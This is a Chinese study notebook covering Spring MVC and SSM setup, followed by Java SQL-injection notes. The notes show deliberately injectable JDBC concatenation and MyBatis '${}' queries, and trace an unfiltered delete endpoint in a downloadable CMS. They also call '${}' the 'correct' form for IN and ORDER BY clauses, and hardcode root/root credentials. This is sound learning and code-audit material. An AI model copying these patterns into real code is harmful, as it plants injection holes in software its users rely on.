         xsi:schemaLocation="http://xmlns.jcp.org/xml/ns/javaee http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd"
         version="4.0">
    <servlet>
        <!-- 设置前端控制器名字 -->
        <servlet-name>dispatcherServlet</servlet-name>
        <!-- 设置前端控制器引用 -->
        <servlet-class>org.springframework.web.servlet.DispatcherServlet</servlet-class>
        <!-- 设置默认加载spring配置文件 -->
        <init-param>
            <param-name>contextConfigLocation</param-name>
            <param-value>classpath:springmvc.xml</param-value>
        </init-param>
    </servlet>
    <!-- 使用dispatcherServlet 并设置拦截路径 -->
    <!-- / 匹配所有的请求(不包括 .jsp) -->
    <!-- /* 匹配所有的请求(包括 .jsp) -->
    <servlet-mapping>
        <servlet-name>dispatcherServlet</servlet-name>
        <url-pattern>/</url-pattern>
    </servlet-mapping>

</web-app>
```

编写对应 spring配置文件， springmvc.xml

```xml
<?xml version="1.0" encoding="UTF-8"?>
<beans xmlns="http://www.springframework.org/schema/beans"
       xmlns:mvc="http://www.springframework.org/schema/mvc"
       xmlns:context="http://www.springframework.org/schema/context"
       xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
       xsi:schemaLocation="
http://www.springframework.org/schema/beans
http://www.springframework.org/schema/beans/spring-beans.xsd
http://www.springframework.org/schema/mvc
http://www.springframework.org/schema/mvc/spring-mvc.xsd
http://www.springframework.org/schema/context
http://www.springframework.org/schema/context/spring-context.xsd">

    <!-- 配置视图解析器 -->
    <bean id="internalResourceViewResolver" class="org.springframework.web.servlet.view.InternalResourceViewResolver">
        <property name="prefix" value="/WEB-INF/jsp/"/>
        <property name="suffix" value=".jsp"/>
    </bean>

    
</beans>
```

编写业务 controller，要么增加注解，要么返回一个 ModelAndView ,装数据。封视图

```java
package com.test.controller;


import org.springframework.web.servlet.ModelAndView;
import org.springframework.web.servlet.mvc.Controller;

import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;

public class HelloController implements Controller {

    @Override
    public ModelAndView handleRequest(HttpServletRequest httpServletRequest, HttpServletResponse httpServletResponse) throws Exception {
        // ModelAndView 模型和视图
        ModelAndView modelAndView = new ModelAndView();

        // 封装对象，放在 ModelAndView 中
        modelAndView.addObject("msg","hello spring mvc");
        // 封装要跳转的视图，放在 ModelAndView
        modelAndView.setViewName("hello");  // 在 WEB-INF/jsp/hello.jsp
        return modelAndView;
    }
}
```

在 spring.xml 注册 bean

```xml
<!-- 注册bean -->
    <bean id="/hello" class="com.test.controller.HelloController"/>
```

编写要跳转的 jsp 页面，显示数据

```jsp
<%@ page contentType="text/html;charset=UTF-8" language="java" %>
<html>
<head>
    <title>Title</title>
</head>
<body>
${msg}
</body>
</html>
```

![image-20220110130134218](img/image-20220110130134218.png)

项目结构

![image-20220110130148502](img/image-20220110130148502.png)

#### 注解版

添加web支持，

由于 maven可能存在资源过滤问题，配置 pom

```xml
<build>
        <resources>
            <resource>
                <directory>src/main/java</directory>
                <includes>
                    <include>**/*.properties</include>
                    <include>**/*.xml</include>
                </includes>
                <filtering>false</filtering>
            </resource>
            <resource>
                <directory>src/main/resources</directory>
                <includes>
                    <include>**/*.properties</include>
                    <include>**/*.xml</include>
                </includes>
                <filtering>false</filtering>
            </resource>
        </resources>
    </build>
```

配置 web.xml

```xml
<?xml version="1.0" encoding="UTF-8"?>
<web-app xmlns="http://xmlns.jcp.org/xml/ns/javaee"
         xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
         xsi:schemaLocation="http://xmlns.jcp.org/xml/ns/javaee http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd"
         version="4.0">
    <servlet>
        <!-- 设置前端控制器名字 -->
        <servlet-name>dispatcherServlet</servlet-name>
        <!-- 设置前端控制器引用 -->
        <servlet-class>org.springframework.web.servlet.DispatcherServlet</servlet-class>
        <!-- 设置默认加载spring配置文件 -->
        <init-param>
            <param-name>contextConfigLocation</param-name>
            <param-value>classpath:springmvc.xml</param-value>
        </init-param>
    </servlet>
    <!-- 使用dispatcherServlet 并设置拦截路径 -->
    <!-- / 匹配所有的请求(不包括 .jsp) -->
    <!-- /* 匹配所有的请求(包括 .jsp) -->
    <servlet-mapping>
        <servlet-name>dispatcherServlet</servlet-name>
        <url-pattern>/</url-pattern>
    </servlet-mapping>

</web-app>
```

配置 springmvc.xml

```xml
<?xml version="1.0" encoding="UTF-8"?>
<beans xmlns="http://www.springframework.org/schema/beans"
       xmlns:mvc="http://www.springframework.org/schema/mvc"
       xmlns:context="http://www.springframework.org/schema/context"
       xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
       xsi:schemaLocation="
http://www.springframework.org/schema/beans
http://www.springframework.org/schema/beans/spring-beans.xsd
http://www.springframework.org/schema/mvc
http://www.springframework.org/schema/mvc/spring-mvc.xsd
http://www.springframework.org/schema/context
http://www.springframework.org/schema/context/spring-context.xsd">

    <!-- 注解扫描 -->
    <context:component-scan base-package="com.test"/>
    <!-- 让Spring MVC不处理静态资源 -->
    <mvc:default-servlet-handler />

    <!-- 配置视图解析器 -->
    <bean id="internalResourceViewResolver" class="org.springframework.web.servlet.view.InternalResourceViewResolver">
        <property name="prefix" value="/WEB-INF/jsp/"/>
        <property name="suffix" value=".jsp"/>
    </bean>

    <!-- 配置spring开始注解mvc支持 -->
    <mvc:annotation-driven></mvc:annotation-driven>

</beans>
```

编写 controller

```java
package com.test.controller;

import org.springframework.stereotype.Controller;
import org.springframework.ui.Model;
import org.springframework.web.bind.annotation.RequestMapping;

@Controller
public class Hello1Controller {
    @RequestMapping("/hello1")
    public String hello(Model model){
        model.addAttribute("msg","hello spring mvc");
        return "hello1";
    }
}
```

hello1.jsp

```jsp
<%@ page contentType="text/html;charset=UTF-8" language="java" %>
<html>
<head>
  <title>Title</title>
</head>
<body>
${msg}
</body>
</html>
```

#### Restful

`add/{p1}/{p2}`

```
@PathVariable int p1,@PathVariable int p2
```

* method属性执行请求类型

  `@RequestMapping(value="/hello",method={RequestMethod.POST})`

* 方法级别的注解

  ```
  @GetMapping
  @PostMapping
  @PutMapping
  @DeleteMapping
  @PatchMapping
  ```

#### 常用注解

* RequestParam : 使用RequestParam把请求中的指定名称的参数传递给控制器中的形参赋值。

  ```java
  @Controller
  public class HelloContraoller {
      @RequestMapping(path = "/hello",params = {"username"})
      public String sayHello(@RequestParam(name="name") String username){
          System.out.println("username"+username);
  
          return "success";
  ```

* RequestBody: 用于获取POST请求的请求体的内容

  ```java
  @RequestMapping(path = "/tijiao")
  public String submit(@RequestBody String body){
      System.out.println(body);
  
      return "success";
  }
  ```

* PathVariable : 获取 url 中占位符的值

* CookieValue : 获取指定 cookie 名称的值

  ```java
      @RequestMapping(path = "/tijiao")
      public String submit(@CookieValue(value = "JSESSIONID") String cookie){
          System.out.println(cookie);
  
          return "success";
      }
  ```

* SessionAttributes  :  对 session 操作

  设置值

  ```java
  @SessionAttributes(value = "msg")
  //该注解表示将request域中获取的属性,存入session域中
  @Controller
  public class HelloContraoller {
      @RequestMapping(path = "/tijiao")
      public String submit(Model model){
  //        该方法默认会自动存储到request域里面
          model.addAttribute("msg","abc");
          return "success";
      }
  }
  ```

  获取值：

  ```java
  @RequestMapping(path="/find")
  public String find(ModelMap modelMap) {
  String username = (String) modelMap.get("username");
  
  return "success";
  ```

  删除值：

  ```java
  @RequestMapping(path="/delete")
  public String delete(SessionStatus status) {
      status.setComplete();
      return "success";
      }
  }
  ```

#### 拦截器

SringMVC的处理器拦截器类似于Servlet中的过滤器 Filter ,用于对处理器进行预处理和后处理。

拦截器只会拦截访问的控制器方法， 如果访问的是jsp/html/css/image/js是不会进行拦截的

添加 pom

```xml
<?xml version="1.0" encoding="UTF-8"?>
<project xmlns="http://maven.apache.org/POM/4.0.0"
         xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
         xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd">
    <modelVersion>4.0.0</modelVersion>

    <groupId>org.example</groupId>
    <artifactId>spring-mvc-interceptor</artifactId>
    <version>1.0-SNAPSHOT</version>

    <properties>
        <maven.compiler.source>8</maven.compiler.source>
        <maven.compiler.target>8</maven.compiler.target>
    </properties>

    <dependencies>
        <dependency>
            <groupId>junit</groupId>
            <artifactId>junit</artifactId>
            <version>4.12</version>
        </dependency>
        <dependency>
            <groupId>org.springframework</groupId>
            <artifactId>spring-webmvc</artifactId>
            <version>5.1.9.RELEASE</version>
        </dependency>
        <dependency>
            <groupId>javax.servlet</groupId>
            <artifactId>servlet-api</artifactId>
            <version>2.5</version>
        </dependency>
        <dependency>
            <groupId>javax.servlet.jsp</groupId>
            <artifactId>jsp-api</artifactId>
            <version>2.2</version>
        </dependency>
        <dependency>
            <groupId>javax.servlet</groupId>
            <artifactId>jstl</artifactId>
            <version>1.2</version>
        </dependency>
        <dependency>
            <groupId>javax.servlet</groupId>
            <artifactId>servlet-api</artifactId>
            <version>2.5</version>
        </dependency>
        <dependency>
            <groupId>javax.servlet.jsp</groupId>
            <artifactId>jsp-api</artifactId>
            <version>2.2</version>
        </dependency>

    </dependencies>

    <build>
        <resources>
            <resource>
                <directory>src/main/java</directory>
                <includes>
                    <include>**/*.properties</include>
                    <include>**/*.xml</include>
                </includes>
                <filtering>false</filtering>
            </resource>
            <resource>
                <directory>src/main/resources</directory>
                <includes>
                    <include>**/*.properties</include>
                    <include>**/*.xml</include>
                </includes>
                <filtering>false</filtering>
            </resource>
        </resources>
    </build>

</project>
```

添加web框架支持，

```xml
<?xml version="1.0" encoding="UTF-8"?>
<web-app xmlns="http://xmlns.jcp.org/xml/ns/javaee"
         xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
         xsi:schemaLocation="http://xmlns.jcp.org/xml/ns/javaee http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd"
         version="4.0">
    <servlet>
        <servlet-name>dispatcherServlet</servlet-name>
        <servlet-class>org.springframework.web.servlet.DispatcherServlet</servlet-class>
        <init-param>
            <param-name>contextConfigLocation</param-name>
            <param-value>classpath:springmvc.xml</param-value>
        </init-param>
    </servlet>

    <servlet-mapping>
        <servlet-name>dispatcherServlet</servlet-name>
        <url-pattern>/</url-pattern>
    </servlet-mapping>

</web-app>
```

配置 springmvc.xml

```xml
<?xml version="1.0" encoding="UTF-8"?>
<beans xmlns="http://www.springframework.org/schema/beans"
       xmlns:mvc="http://www.springframework.org/schema/mvc"
       xmlns:context="http://www.springframework.org/schema/context"
       xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
       xsi:schemaLocation="
http://www.springframework.org/schema/beans
http://www.springframework.org/schema/beans/spring-beans.xsd
http://www.springframework.org/schema/mvc
http://www.springframework.org/schema/mvc/spring-mvc.xsd
http://www.springframework.org/schema/context
http://www.springframework.org/schema/context/spring-context.xsd">

    <context:component-scan base-package="com.test"/>
    <mvc:default-servlet-handler />

    <!-- 配置视图解析器 -->
    <bean id="internalResourceViewResolver" class="org.springframework.web.servlet.view.InternalResourceViewResolver">
        <property name="prefix" value="/WEB-INF/jsp/"/>
        <property name="suffix" value=".jsp"/>
    </bean>

    <mvc:annotation-driven/>

</beans>
```

自定义拦截器

```java
package com.test.config;

import org.springframework.web.servlet.HandlerInterceptor;
import org.springframework.web.servlet.ModelAndView;

import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;

public class MyInterceptor implements HandlerInterceptor {
    // return true; 执行下一个拦截器，放行
    // return false;  不执行下一个拦截器，拦截
    @Override
    public boolean preHandle(HttpServletRequest request, HttpServletResponse response, Object handler) throws Exception {
        System.out.println("处理前");
        return true;
    }

    @Override
    public void postHandle(HttpServletRequest request, HttpServletResponse response, Object handler, ModelAndView modelAndView) throws Exception {
        System.out.println("处理后");
    }

    @Override
    public void afterCompletion(HttpServletRequest request, HttpServletResponse response, Object handler, Exception ex) throws Exception {
        System.out.println("清理");
    }
}
```

配置 springmvc.xml

```xml
<!-- 拦截器配置 -->
<mvc:interceptors>
    <mvc:interceptor>
        <!-- 包括这个请求下面的所有请求 -->
        <mvc:mapping path="/**"/>
        <bean class="com.test.config.MyInterceptor"/>
    </mvc:interceptor>
</mvc:interceptors>
```

编写Controller

```java
package com.test.controller;

import org.springframework.web.bind.annotation.GetMapping;
import org.springframework.web.bind.annotation.RestController;

@RestController
public class TestController {
    @GetMapping("/test")
    public String test(){
        System.out.println("TestController.test");
        return "OK";
    }
}
```

启动，成功

```txt
处理前
TestController.test
处理后
清理
```

https://blog.csdn.net/weixin_44635198/article/details/107444925

## SSM整合

#### Spring整合SpringMVC

导入依赖

```xml
<?xml version="1.0" encoding="UTF-8"?>
<project xmlns="http://maven.apache.org/POM/4.0.0"
         xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
         xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd">
    <modelVersion>4.0.0</modelVersion>

    <groupId>org.example</groupId>
    <artifactId>ssm</artifactId>
    <version>1.0-SNAPSHOT</version>

    <properties>
        <maven.compiler.source>8</maven.compiler.source>
        <maven.compiler.target>8</maven.compiler.target>
    </properties>
    <dependencies>
    <dependency>
        <groupId>org.springframework</groupId>
        <artifactId>spring-webmvc</artifactId>
        <version>5.1.9.RELEASE</version>
    </dependency>

    <!--添加Servlet和JSP依赖-->
    <dependency>
        <groupId>javax.servlet</groupId>
        <artifactId>javax.servlet-api</artifactId>
        <version>3.1.0</version>

    </dependency>

    <dependency>
        <groupId>javax.servlet.jsp</groupId>
        <artifactId>jsp-api</artifactId>
        <version>2.2</version>

    </dependency>

    <dependency>
        <groupId>javax.servlet</groupId>
        <artifactId>jstl</artifactId>
        <version>1.2</version>

    </dependency>
    <dependency>
        <groupId>com.alibaba</groupId>
        <artifactId>fastjson</artifactId>
        <version>1.2.75</version>
    </dependency>

    <dependency>
        <groupId>org.springframework</groupId>
        <artifactId>spring-jdbc</artifactId>
        <version>5.2.7.RELEASE</version>
    </dependency>

    <!--spring AOP的包-->
    <dependency>
        <groupId>org.springframework</groupId>
        <artifactId>spring-aspects</artifactId>
        <version>5.2.7.RELEASE</version>
    </dependency>

    <dependency>
        <groupId>org.springframework</groupId>
        <artifactId>spring-test</artifactId>
        <version>5.2.7.RELEASE</version>
    </dependency>

    <dependency>
        <groupId>org.mybatis</groupId>
        <artifactId>mybatis-spring</artifactId>
        <version>1.3.3</version>
    </dependency>

    <dependency>
        <groupId>mysql</groupId>
        <artifactId>mysql-connector-java</artifactId>
        <version>8.0.20</version>
    </dependency>

    <dependency>
        <groupId>junit</groupId>
        <artifactId>junit</artifactId>
        <version>4.12</version>
        <scope>test</scope>
    </dependency>

    <dependency>
        <groupId>org.mybatis</groupId>
        <artifactId>mybatis</artifactId>
        <version>3.5.5</version>
    </dependency>

    <dependency>

        <groupId>com.alibaba</groupId>

        <artifactId>druid</artifactId>

        <version>1.1.16</version>
    </dependency>

    <dependency>
        <groupId>org.slf4j</groupId>
        <artifactId>slf4j-api</artifactId>
        <version>1.7.30</version>
    </dependency>

    <dependency>
        <groupId>ch.qos.logback</groupId>
        <artifactId>logback-classic</artifactId>
        <version>1.2.3</version>
    </dependency>

    <!--注解依赖 https://mvnrepository.com/artifact/javax.annotation/javax.annotation-api -->
    <dependency>
        <groupId>javax.annotation</groupId>
        <artifactId>javax.annotation-api</artifactId>
        <version>1.3.2</version>
    </dependency>

    </dependencies>
</project>
```

实体类：

```java
package com.test.pojo;

import java.io.Serializable;

public class Account implements Serializable {
    private int id;
    private String name;
    private double money;

    public Account() {
    }
    public Account(int id, String name, double money) {
        this.id = id;
        this.name = name;
        this.money = money;
    }

    public int getId() {
        return id;
    }

    public void setId(int id) {
        this.id = id;
    }

    public String getName() {
        return name;
    }

    public void setName(String name) {
        this.name = name;
    }

    public double getMoney() {
        return money;
    }

    public void setMoney(double money) {
        this.money = money;
    }

    @Override
    public String toString() {
        return "Account{" +
                "id=" + id +
                ", name='" + name + '\'' +
                ", money=" + money +
                '}';
    }
}
```

dao接口

```java
package com.test.dao;

import com.test.pojo.Account;

import java.util.List;

public interface AccountDao {
    List<Account> findAll();
    void saveAccount();
}
```

web.xml

```xml
<?xml version="1.0" encoding="UTF-8"?>
<web-app xmlns="http://xmlns.jcp.org/xml/ns/javaee"
         xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
         xsi:schemaLocation="http://xmlns.jcp.org/xml/ns/javaee http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd"
         version="4.0">

    <servlet>
        <!-- 配置前端控制器 -->
        <servlet-name>dispatcherServlet</servlet-name>
        <servlet-class>org.springframework.web.servlet.DispatcherServlet</servlet-class>
        <!-- 配置加载springmvc.xml -->
        <init-param>
            <param-name>contextConfigLocation</param-name>
            <param-value>classpath:springmvc.xml</param-value>
        </init-param>
    </servlet>
    <servlet-mapping>
        <!-- 配置控制器拦截路径 -->
        <servlet-name>dispatcherServlet</servlet-name>
        <url-pattern>/</url-pattern>
    </servlet-mapping>

    <!-- 配置编码 -->
    <filter>
        <filter-name>characterEncodingFilter</filter-name>
        <filter-class>org.springframework.web.filter.CharacterEncodingFilter</filter-class>
        <init-param>
            <param-name>encoding</param-name>
            <param-value>UTF-8</param-value>
        </init-param>
    </filter>
    <filter-mapping>
        <filter-name>characterEncodingFilter</filter-name>
        <url-pattern>/*</url-pattern>
    </filter-mapping>
    <!-- 使用监听器加载spring.xml 文件 -->
    <listener>
        <listener-class>org.springframework.web.context.ContextLoaderListener</listener-class>
    </listener>
    <context-param>
        <param-name>contextConfigLocation</param-name>
        <param-value>classpath:applicationContext.xml</param-value>
    </context-param>

</web-app>
```

application.xml

```xml
<?xml version="1.0" encoding="UTF-8"?>
<beans xmlns="http://www.springframework.org/schema/beans"
       xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
       xmlns:aop="http://www.springframework.org/schema/aop"
       xmlns:tx="http://www.springframework.org/schema/tx"
       xmlns:context="http://www.springframework.org/schema/context"
       xsi:schemaLocation="http://www.springframework.org/schema/beans
       http://www.springframework.org/schema/beans/spring-beans.xsd
               http://www.springframework.org/schema/tx
http://www.springframework.org/schema/tx/spring-tx.xsd
http://www.springframework.org/schema/aop
http://www.springframework.org/schema/aop/spring-aop.xsd
http://www.springframework.org/schema/context
http://www.springframework.org/schema/context/spring-context.xsd">
    <!--    开启注解扫描-->
    <context:component-scan base-package="com.test">
        <!--        配置不扫描Controller注解-->
        <context:exclude-filter type="annotation" expression="org.springframework.stereotype.Controller"/>

    </context:component-scan>


</beans>
```

这里需要配置不扫描Controller注解，Controller要交给Spring mvc来操作。

springmvc.xml

```xml
<?xml version="1.0" encoding="UTF-8"?>
<beans xmlns="http://www.springframework.org/schema/beans"
       xmlns:mvc="http://www.springframework.org/schema/mvc"
       xmlns:context="http://www.springframework.org/schema/context"
       xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
       xsi:schemaLocation="
http://www.springframework.org/schema/beans
http://www.springframework.org/schema/beans/spring-beans.xsd
http://www.springframework.org/schema/mvc
http://www.springframework.org/schema/mvc/spring-mvc.xsd
http://www.springframework.org/schema/context
http://www.springframework.org/schema/context/spring-context.xsd">
    <!-- 扫描controller的注解，别的不扫描 -->
    <context:component-scan base-package="com.test">
        <context:include-filter type="annotation" expression="org.springframework.stereotype.Controller"/>
    </context:component-scan>
    <!-- 配置视图解析器 -->
    <bean id="viewResolver" class="org.springframework.web.servlet.view.InternalResourceViewResolver">
        <!-- JSP文件所在的目录 -->
        <property name="prefix" value="/WEB-INF/pages/" />
        <!-- 文件的后缀名 -->
        <property name="suffix" value=".jsp" />
    </bean>
    <!-- 设置静态资源不过滤 -->
    <!-- 让Spring MVC不处理静态资源 -->
    <mvc:default-servlet-handler />
    <!-- 开启对SpringMVC注解的支持 -->
    <mvc:annotation-driven />
</beans>
```

配置完成，写其他的类，

service接口

```java
package com.test.service;

import com.test.pojo.Account;

import java.util.List;

public interface AccountService {
    List<Account> findAll();
    void saveAccount();
}
```

service 实现

```java
package com.test.service.impl;

import com.test.pojo.Account;
import com.test.service.AccountService;
import jdk.nashorn.internal.ir.LexicalContextNode;
import org.springframework.stereotype.Service;

import java.util.List;

@Service("accountService")
public class AccountServiceImpl implements AccountService {
    @Override
    public List<Account> findAll() {
        System.out.println("业务层，查询所有账户信息");
        return null;
    }

    @Override
    public void saveAccount() {
        System.out.println("业务层，保存用户信息");
    }
}
```

controller

```java
package com.test.controller;

import com.test.pojo.Account;
import com.test.service.AccountService;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.stereotype.Controller;
import org.springframework.ui.Model;
import org.springframework.web.bind.annotation.RequestMapping;

import java.util.List;

@Controller
@RequestMapping("/account")
public class TestController {
    @Autowired
    private AccountService accountService;

    @RequestMapping("/findAll")
    public String findAll(Model model){
        List<Account> accountList = accountService.findAll();
        model.addAttribute("accountList",accountList);
        return "list";
    }
}
```

#### 整合 Mybatis

需要在 spring配置里把 sqlsession 工厂类配置进去

applicationContext.xml

```xml
<?xml version="1.0" encoding="UTF-8"?>
<beans xmlns="http://www.springframework.org/schema/beans"
       xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
       xmlns:aop="http://www.springframework.org/schema/aop"
       xmlns:tx="http://www.springframework.org/schema/tx"
       xmlns:context="http://www.springframework.org/schema/context"
       xsi:schemaLocation="http://www.springframework.org/schema/beans
       http://www.springframework.org/schema/beans/spring-beans.xsd
               http://www.springframework.org/schema/tx
http://www.springframework.org/schema/tx/spring-tx.xsd
http://www.springframework.org/schema/aop
http://www.springframework.org/schema/aop/spring-aop.xsd
http://www.springframework.org/schema/context
http://www.springframework.org/schema/context/spring-context.xsd">
    <!--    开启注解扫描-->
    <context:component-scan base-package="com.test">
        <!--        配置不扫描Controller注解-->
        <context:exclude-filter type="annotation" expression="org.springframework.stereotype.Controller"/>

    </context:component-scan>

    <!-- 配置连接对象 -->
    <bean id="dataSource" class="org.springframework.jdbc.datasource.DriverManagerDataSource">
        <property name="driverClassName" value="com.mysql.cj.jdbc.Driver"/>
        <property name="url" value="jdbc:mysql://127.0.0.1:3306/security?serverTimezone=UTC&amp;useUnicode=true&amp;characterEncoding=UTF-8"/>
        <property name="username" value="root"/>
        <property name="password" value="root"/>
    </bean>
    <!-- 配置Sqlsession 的工厂 -->
    <bean id="sqlSessionFactory" class="org.mybatis.spring.SqlSessionFactoryBean">
        <property name="dataSource" ref="dataSource"/>
    </bean>
    <!-- 配置扫描dao的包 -->
    <bean id="mapperScanner" class="org.mybatis.spring.mapper.MapperScannerConfigurer">
        <property name="basePackage" value="com.test.dao"/>
    </bean>

</beans>
```

dao

```java
package com.test.dao;

import com.test.pojo.Account;
import org.apache.ibatis.annotations.Insert;
import org.apache.ibatis.annotations.Select;
import org.springframework.stereotype.Repository;

import java.util.List;

// 使用注解将该接口注入到 spring
@Repository
public interface AccountDao {
    @Select("select * from users")
    List<Account> findAll();
    @Insert("insert into users(username,password) values(#{username},#{password})")
    void saveAccount();
}
```

serviceImpl

```java
package com.test.service.impl;

import com.test.dao.AccountDao;
import com.test.pojo.Account;
import com.test.service.AccountService;
import jdk.nashorn.internal.ir.LexicalContextNode;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.stereotype.Service;

import java.util.List;

@Service("accountService")
public class AccountServiceImpl implements AccountService {
    @Autowired
    private AccountDao accountDao;

    @Override
    public List<Account> findAll() {
        System.out.println("业务层，查询所有账户信息");
        return accountDao.findAll();
    }

    @Override
    public void saveAccount() {
        System.out.println("业务层，保存用户信息");
        accountDao.saveAccount();
    }
}
```

controller

```java
package com.test.controller;

import com.test.pojo.Account;
import com.test.service.AccountService;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.stereotype.Controller;
import org.springframework.ui.Model;
import org.springframework.web.bind.annotation.RequestMapping;

import java.util.List;

@Controller
@RequestMapping("/account")
public class TestController {
    @Autowired
    private AccountService accountService;

    @RequestMapping("/findAll")
    public String findAll(Model model){
        List<Account> accountList = accountService.findAll();
        model.addAttribute("accountList",accountList);
        return "list";
    }
}
```

![image-20220110153712425](img/image-20220110153712425.png)

#### 配置事务管理

在 spring 配置里面配置事务管理

applicationContext

```xml
<!-- 配置事务管理 -->
<bean id="transactionManager" class="org.springframework.jdbc.datasource.DataSourceTransactionManager">
    <property name="dataSource" ref="dataSource"/>
</bean>
<!-- 配置事务的通知 -->
<tx:advice id="txAdvice" transaction-manager="transactionManager">
    <tx:attributes>
        <tx:method name="*" propagation="REQUIRED" read-only="false"/>
        <tx:method name="find*" propagation="SUPPORTS" read-only="true"/>
    </tx:attributes>
</tx:advice>
<!-- 配置AOP -->
<aop:config>
    <!-- 配置切入点表达式 -->
    <aop:pointcut expression="execution(* com.test.serivce.*.*(..))"
                  id="pt1"/>
    <!-- 建立通知和切入点表达式的关系 -->
    <aop:advisor advice-ref="txAdvice" pointcut-ref="pt1"/>
</aop:config>
```

AccountController类加多一个保存的方法，让jsp页面的表单提交到该方法后，进行获取，然后调用保存的方法进行存储数据

```java
@RequestMapping("/save")
    public String save(Account account){
        accountService.saveAccount(account);
        return "list";
    }
```

jsp

```jsp
<%@ page contentType="text/html;charset=UTF-8" language="java" %>
<html>
  <head>
    <title>$Title$</title>
  </head>
  <body>
  <form action="${pageContext.request.contextPath}/account/save" method="post">
    id: <input name="id" type="text">
    姓名： <input name="username" type="text">
    密码： <input name="password" type="text">
    <input type="submit" value="提交">
  </form>
  </body>
</html>
```

## SpringBoot篇

刚写完课设，就不写了。

# java 安全

## SQL注入篇

#### JDBC注入分析

JDBC的连接是比较繁琐的，并且是最原始的连接方式，我们来看看JDBC的最原始的连接代码

Get型注入：

```
@WebServlet("/demo")
public class domain extends HttpServlet {

    @Override
    protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {
        System.out.println("get访问");
        String id = req.getParameter("id");



        Connection conn = null;

        try {
            Class.forName("com.mysql.jdbc.Driver");

            conn = DriverManager.getConnection("jdbc:mysql://127.0.0.1:3306/demo", "root", "root");
            String sql = "select * from users where id = '"+id+"' ";

            Statement statement = conn.createStatement();
            ResultSet resultSet = statement.executeQuery(sql);
        } catch (ClassNotFoundException | SQLException e) {
            e.printStackTrace();
        }

    }

    @Override
    protected void doPost(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {
        this.doGet(req,resp);
    }
}
```

这里编写了一个serlvet获取get的值，连接数据库使用了jdbc的方式进行连接，采用了拼接的方式直接拼接到了sql语句里面去。这样的代码如果在传入前没做过滤直接拼接，就会产生sql注入。

在实际运用当中如果不采用框架使用JDBC的方式，普遍会编写一个工具类来完成这些繁琐的配置，但是具体的实现还是调用这些方法来进行实现，只是进行了一个简单的封装。

在代码审计的时候，如果看到是JDBC的方式进行连接可以跟踪一下他的代码，看他有没有调用自己定义的过滤方法，如果没有的话，就会存在sql注入，当然这是在未使用预编译的情况下。

后面的重复的比较多，都是大致相同，我后面就贴出一些主要的代码进行分析。

POST型注入：

```
String sql = "select * from users where username = '"+username+"' and password = '"+password+"' ";
```

GET的注入和POST的其实差不多，只是获取值的地方不一样。

Like型注入：

```
 String name = req.getParameter("name");
            String sql = "select * from users where name like '%'+name+'%'";
```

Header注入：

```
String referer = req.getHeader("referer");
String sql = "update user set referer ='"+referer+"'";
```

以上列了几种方式都是JDBC采用拼接的方式造成SQL注入的代码。

#### JDBC预编译

预编译的定义其实就是使用问号先来占位，后面再传入具体的值。
 后面传值的时候，程序会把传入的参数，自动转换为spring类型的字符，并不会拼接成sql语句生效。

```
Connection  conn = JDBCUtils.getConnection();
String sql = "select * from users where username = ? and password = ?";
PreparedStatement pstmt = conn.prepareStatement(sql);  //使用预编译传入sql语句
pstmt.setString(1,username);   //设置第一个参数为username
pstmt.setString(2,password);   //设置第二个参数为password
pstmt.executeQuery();
```

#### Mybatis注入

Mybatis获取值的方式有两种，分别是`${}` 和 `#{}`。

```
#{}:解析的是占位符问号，可以防止SQL注入，使用了预编译。
${}:直接获取值
```

在Mybatis里面一般会采用`#{}`来进行取值，但是也会有特殊情况。

##### **like注入**

```xml
<select id="findlike" resultType="com.test.domain.User" parameterType="string">
     select * from user where name like   '%#{name}%'，
</select>
```

我们在运行的时候会发现，代码直接就会抛出异常。

```
<select id="findlike" resultType="com.test.domain.User" parameterType="string">
     select * from user where name like  '%${name}%'，
</select>
```

需要使用${}的方式进行取值。

或者是

```xml
<select id="findlike" resultType="com.test.domain.User" parameterType="string">
    select * from user where name like  #{name}
</select>
```

还可以

```xml
<select id="findlike" resultType="com.test.domain.User" parameterType="string">
    select * from user where name like concat('%',#{name},'%')
</select>
```

##### in后注入

```xml
Select * from news where id in (#{id})
```

也是拼接使用预编译这样的代码也会报错。

正确写法：

```xml
Select * from news where id in (${id})
```

##### order by 注入

```xml
Select * from news where title ='#{titlename}' order by #{time} asc
```

执行会报错

正确写法：

```xml
Select * from news where title ='#{titlename}' order by ${time} asc
```

#### CMS审计

https://www.onlinedown.net/soft/1144063.htm

简单看一下，SSM框架

mybatis用xml的方式配置。

找到xml

找 `$` 符，

![image-20220111105856079](img/image-20220111105856079.png)

找到 `deleteArticleByIds` service 接口，

![image-20220111110133076](img/image-20220111110133076.png)

无过滤。

接下来就可以去找该service对应的Controller，这个可以使用idea的ctrl+Alt+H快捷键去查询调用层次，去看Controller的位置。

![image-20220111110339408](img/image-20220111110339408.png)

找到controller处，

![image-20220111110459214](img/image-20220111110459214.png)

接口 `/admin/article/delete`

登录后台，

![image-20220111111144564](img/image-20220111111144564.png)

代码里很多这类型的。

可以直接全局在 mapper 所在文件搜索，

![image-20220111112322002](img/image-20220111112322002.png)

## XSS篇

对用户输入过滤不严。

